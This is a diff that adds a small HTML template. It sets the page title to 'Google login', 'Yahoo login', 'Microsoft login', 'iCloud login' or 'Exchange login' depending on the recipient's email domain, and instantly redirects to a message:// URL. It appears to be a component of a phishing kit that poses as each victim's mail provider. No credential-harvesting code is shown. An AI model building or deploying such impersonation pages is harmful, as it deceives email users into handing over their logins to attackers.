@@ -1,0 +1,21 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="refresh" content="0;url=message://dummy">
+<meta content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, width=device-width, height=device-height" name="viewport">
+{% if "gmail.com" in client.email_address %}
+        <title>Google login</title>
+{% elif "yahoo.com" in client.email_address %}
+        <title>Yahoo login</title>
+{% elif "hotmail.com" in client.email_address %}
+        <title>Microsoft login</title>
+{% elif "icloud.com" in client.email_address %}
+        <title>iCloud login</title>
+{% else %}
+        <title>Exchange login</title>
+{% endif %}
+</head>
+<body>
+</body>
+</html>
